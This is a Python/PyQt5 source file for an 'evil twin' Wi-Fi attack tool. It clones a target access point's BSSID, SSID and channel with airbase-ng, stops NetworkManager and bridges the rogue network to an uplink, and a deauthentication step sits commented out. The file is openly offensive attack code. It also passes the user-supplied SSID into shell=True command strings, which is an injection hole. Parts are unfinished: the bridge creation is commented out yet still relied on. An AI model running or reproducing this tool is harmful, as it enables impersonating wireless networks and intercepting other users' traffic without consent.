import time
import subprocess
from subprocess import Popen
from subprocess import PIPE
from PyQt5 import QtCore
import psutil

class EvilTwin(QtCore.QThread):
    write_log_signal = QtCore.pyqtSignal(str)
    write_list_signal = QtCore.pyqtSignal(str)
    finished_signal = QtCore.pyqtSignal()

    def __init__(self, parent=None, data=0):
        super(EvilTwin, self).__init__(parent)
        self.is_running=True
        self.data=data

    def runcmd(self, cmd):
        p=subprocess.run(cmd, stdout=PIPE, stderr=PIPE, encoding="utf-8", errors=None)
        out = p.stdout.strip()
        err = p.stderr.strip()
        if out != '':
            self.write_list_signal.emit(out)
        if err != '':
            self.write_list_signal.emit(err)

    def runcmd2(self, cmd):
        with Popen(cmd, shell=True, encoding="UTF-8") as p:
            return

    def wifi_on(self):
        self.write_list_signal.emit('Enable Wifi')
        self.runcmd(["sudo", "rfkill", "unblock", "wifi"])
        time.sleep(4) #TODO test if still needed with rfkill cmd

    def stop_iface(self, iface):
        self.write_list_signal.emit('Stop interface ' + iface)
        self.runcmd(["sudo", "ip", "link", "set", iface, "down"])

    def wifi_set_type(self, iface, wifi_type):
        self.write_list_signal.emit('Set ' + iface + ' to ' + wifi_type + ' mode')
        self.stop_iface(self.mon_iface)
        self.runcmd(["sudo", "iw", iface, "set", "type", wifi_type])
        self.start_iface(self.mon_iface)

    def set_region(self):
        self.write_list_signal.emit('Set wifi region')
        self.runcmd(["sudo", "iw", "reg", "set", "CH"])

    def set_radio_power(self, iface):
        self.write_list_signal.emit('Set wifi signal power')
        self.runcmd(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "20"]) #TODO that doesnt work

    def start_iface(self, iface):
        self.write_list_signal.emit('Start interface ' + iface)
        self.runcmd(["sudo", "ip", "link", "set", iface, "up"])

    def stop_network_manager(self):
        self.write_list_signal.emit('Stop NetworkManager')
        self.runcmd(["sudo", "systemctl", "stop", "NetworkManager"])

    def start_network_manager(self):
        self.write_list_signal.emit('Start NetworkManager')
        self.runcmd(["sudo", "systemctl", "enable", "NetworkManager"])
        self.runcmd(["sudo", "systemctl", "start", "NetworkManager"])

    def start_ap(self):
        if not self.new_ssid == '':
            self.write_list_signal.emit('Start new access point ' + self.new_ssid)
            self.runcmd2(['sudo airbase-ng --essid ' + self.new_ssid + ' ' + self.mon_iface + ' && exit &'])
        else:
            self.write_list_signal.emit('Start twin access point ' + self.ap['ssid'])
            self.runcmd2(['sudo airbase-ng -a '+ self.ap['bssid'] +' --essid ' + self.ap['ssid'] + ' -c ' + self.ap['channel'] + ' ' + self.mon_iface + ' && exit &'])
        time.sleep(20) #This sleep is important ["ifconfig", "at0", "0.0.0.0", "up"] works only when AP is totally rdy

    def create_bridge(self):
        #self.write_list_signal.emit('Create network bridge')
        #self.runcmd(["sudo", "brctl", "addbr", "evil"])
        #self.runcmd(["sudo", "brctl", "addif", "evil", self.uplink_iface])
        #self.runcmd(["sudo", "brctl", "addif", "evil", "at0"])

        #TODO dhcp, firewall nat forwarding masquerade
        
        

        #self.start_iface(self.uplink_iface)
        #self.start_iface('at0')
        ##self.runcmd(["sudo", "ip", "address", "flush", "dev", self.uplink_iface])
        ##self.runcmd(["sudo", "ip", "address", "flush", "dev", "at0"])
        #self.start_iface('evil')
        

        #old way
        self.runcmd(["sudo", "ifconfig", self.uplink_iface, "0.0.0.0", "up"])
        self.runcmd(["sudo", "ifconfig", "at0", "0.0.0.0", "up"])
        self.runcmd(["sudo", "ifconfig", "evil", "up"])

    def remove_bridge(self):
        self.write_list_signal.emit('Remove network bridge')
        self.stop_iface('evil')
        self.runcmd(["sudo", "brctl", "delif", "evil", self.uplink_iface])
        self.runcmd(["sudo", "brctl", "delbr", "evil"])

    def start_dhclient(self):
        self.write_list_signal.emit('Start dhcp client')
        self.runcmd2(["sudo dhclient evil && exit &"])

    def stop_dhclient(self):
        self.write_list_signal.emit('Stop dhcp client')
        self.runcmd(["sudo", "dhclient", "-r", "evil"])
        self.stop_iface(self.uplink_iface)
        self.start_iface(self.uplink_iface)

    def send_deauth(self):
        self.write_list_signal.emit('Send deauth packets')
        # p = Popen(['sudo', 'aireplay-ng', '--deauth', '0', '-a', MAC???, SETTINGS['ifaceMON'], '--ignore-negative-one'], stdout=FNULL, stderr=FNULL)
        #time.sleep(2)

    def find_proc(self, name):
        for proc in psutil.process_iter():
            try:
                pinfo = proc.as_dict(attrs=['pid', 'name'])
                if pinfo['name'] == name:
                    return True
                else:
                    continue
            except psutil.NoSuchProcess:
                pass
        return False    

    def kill_airbase(self):
        self.runcmd(["sudo", "killall", "airbase-ng"])

    def run(self):
        self.write_list_signal.emit('Starting thread')
        self.ap = {}
        apdata = self.data["t1_value_1"].split('  ')
        if len(apdata) >= 3:
            self.ap = {"bssid": apdata[0], "ssid": apdata[1], "channel": apdata[2]}
        self.new_ssid = self.data["t1_value_2"]
        self.mon_iface = self.data["t1_value_3"]
        self.uplink_iface = self.data["t1_value_4"]
        deauth = self.data["t1_value_5"]

        if self.new_ssid != '' or len(self.ap) >= 3:
            self.wifi_on()
            self.wifi_set_type(self.mon_iface, "monitor")
            self.set_region()
            self.set_radio_power(self.mon_iface)
            self.stop_network_manager()
            self.start_ap()
            self.create_bridge()
            self.start_dhclient()
            self.send_deauth()
            self.write_list_signal.emit('Being evil')

            #loop untill airbase proc killed
            while self.find_proc('airbase-ng') == True:
                time.sleep(2)
            self.stop()
        else:
            self.write_list_signal.emit('warning: pls choose ssid or set a new one')
            self.finished_signal.emit()

    def stop(self):
        self.write_list_signal.emit('Stopping thread')
        self.kill_airbase()
        self.wifi_set_type(self.mon_iface, "managed")
        self.start_network_manager()
        self.remove_bridge()
        self.stop_dhclient()
        self.write_list_signal.emit('Stopped being evil')
        self.is_running=False
        self.finished_signal.emit()
        self.terminate()
